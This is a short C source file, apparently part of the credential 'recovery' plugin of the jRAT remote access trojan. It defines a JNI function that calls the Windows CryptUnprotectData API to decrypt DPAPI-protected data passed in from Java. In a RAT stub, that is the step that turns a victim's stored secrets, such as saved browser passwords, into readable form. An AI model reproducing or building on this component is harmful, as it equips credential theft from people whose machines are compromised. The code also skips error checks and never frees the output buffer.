#include "jrat_plugin_recovery_stub_NativeUtils.h"

#include <windows.h>

JNIEXPORT jbyteArray JNICALL Java_jrat_plugin_recovery_stub_NativeUtils_cryptUnprotectData(JNIEnv * env, jclass clazz, jbyteArray bytes) {
	jbyte * data = (*env)->GetByteArrayElements(env, bytes, NULL);

	int length = (*env)->GetArrayLength(env, bytes);

	DATA_BLOB in = { length, data };
	DATA_BLOB out = { 0, NULL };

	CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);

	jbyteArray buff	= (*env)->NewByteArray(env, out.cbData);
	(*env)->SetByteArrayRegion(env, buff, 0, out.cbData, out.pbData);

	return buff;
}
